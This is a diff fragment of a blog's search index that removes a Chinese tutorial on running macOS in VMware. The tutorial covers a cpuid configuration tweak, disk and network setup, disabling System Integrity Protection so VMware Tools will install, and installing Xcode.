-<li>打开文件找到一行类似 <code>guestOS = &quot;darwin17-64&quot;</code></li>
-<li>下一行追加 <code>cpuid.1.eax = &quot;0000:0000:0000:0001:0000:0110:1010:0101&quot;</code></li>
-</ol>
-</blockquote>
-<p>保存再启动就可以解决，大概原理是虚拟机会对对核心进行检验，用mask来欺骗，从而过CPU不必要的检查</p>
-<p>(#其实我也不知道，手动滑稽)</p>
-<h1 id="0x2-系统安装"><a href="#0x2-系统安装" class="headerlink" title="0x2 系统安装"></a>0x2 系统安装</h1><p>进入界面后第一件事，调出终端建议进行以下步骤方便后续安装VMware Tools ：<a href="#0x4-VMware-Tools%E5%AE%89%E8%A3%85">VMware Tools安装</a></p>
-<p>再进行进行磁盘管理</p>
-<p><img src="https://i.loli.net/2020/03/02/tz6FoAHBXE2hwQc.png" alt="5.png"></p>
-<p><img src="https://i.loli.net/2020/03/02/wgE1uv3GJy6AFcD.png" alt="6.png"></p>
-<p>作为系统盘呗，需要自己再自行添加硬盘</p>
-<p><img src="https://i.loli.net/2020/03/02/DrBsNQeHL1ipIlj.png" alt="7.png"></p>
-<p>之后就是等它静默安装，然后再进行常规的系统配置</p>
-<p><img src="https://i.loli.net/2020/03/02/r8wZbAIHmqoQEeu.png" alt="9.png"></p>
-<p>安装好VMware Tools后就开始享用OS X吧</p>
-<h1 id="0x3-添加硬盘及网络配置"><a href="#0x3-添加硬盘及网络配置" class="headerlink" title="0x3 添加硬盘及网络配置"></a>0x3 添加硬盘及网络配置</h1><p><img src="https://i.loli.net/2020/03/02/uzWvTp3qRwmAUOD.png" alt="10.png"></p>
-<p>设置网络 设置 - &gt; 网络 - &gt; WLAN - &gt; 更改适配器设置</p>
-<p><img src="https://i.loli.net/2020/03/02/QeGR8d5CFU3whp1.png" alt="11.png"></p>
-<p><img src="https://i.loli.net/2020/03/02/Voeaxsi57QCBF8N.png" alt="12.png"></p>
-<p><img src="https://i.loli.net/2020/03/02/wWmnTudCaGfqscD.png" alt="12.png"></p>
-<p><img src="https://i.loli.net/2020/03/02/U4fxJuE8lvwtVO1.png" alt="12.png"></p>
-<p>然后进Mac看设置</p>
-<p><img src="https://i.loli.net/2020/03/02/cFeDdaQlm8326WZ.png" alt="13.png"></p>
-<p>显示绿点则说明连接成功</p>
-<h1 id="0x4-VMware-Tools安装"><a href="#0x4-VMware-Tools安装" class="headerlink" title="0x4 VMware Tools安装"></a>0x4 VMware Tools安装</h1><p>反复装不上VMware Tools 通过百度发现Mac有SIP系统完整性保护机制</p>
-<p>我们就进入Recovery里手动关闭</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># csrutil status &#x2F;&#x2F;检查状态 enable 为开启</span><br><span class="line"># csrutil disable &#x2F;&#x2F;关闭保护机制</span><br></pre></td></tr></table></figure>
-
-
-
-
-<p><img src="https://i.loli.net/2020/03/03/P6o8CTOLGdAfkIQ.png" alt="16.png"></p>
-<p><img src="https://i.loli.net/2020/03/03/or9MFBzdan1KvGC.png" alt="17.png"></p>
-<p>之后便可以开心的安装VMware Tools 了</p>
-<p><img src="https://i.loli.net/2020/03/03/cKBhbYw6ROHlTvI.png" alt="18.png"></p>
-<h1 id="0x5-安装Xcode"><a href="#0x5-安装Xcode" class="headerlink" title="0x5 安装Xcode"></a>0x5 安装Xcode</h1><p>就在商店自己安装呗，现在Xcode的最低支持版本是 OS X 10.14.4</p>
-<p><img src="https://i.loli.net/2020/03/03/S6VIMvT7AEYxaLo.png" alt="19.png"></p>
-<p>然后就可以 愉cao 快dan的 敲xiu 码bug 了</p>
-<hr>
-<p>[^]: 注：本文资料大多来源于网络，如果有侵权，请联系作者删除。2020/03/03 二次修改。</p>
-]]></content>
-      <tags>
-        <tag>黑苹果</tag>
       </tags>
   </entry>
 </search>
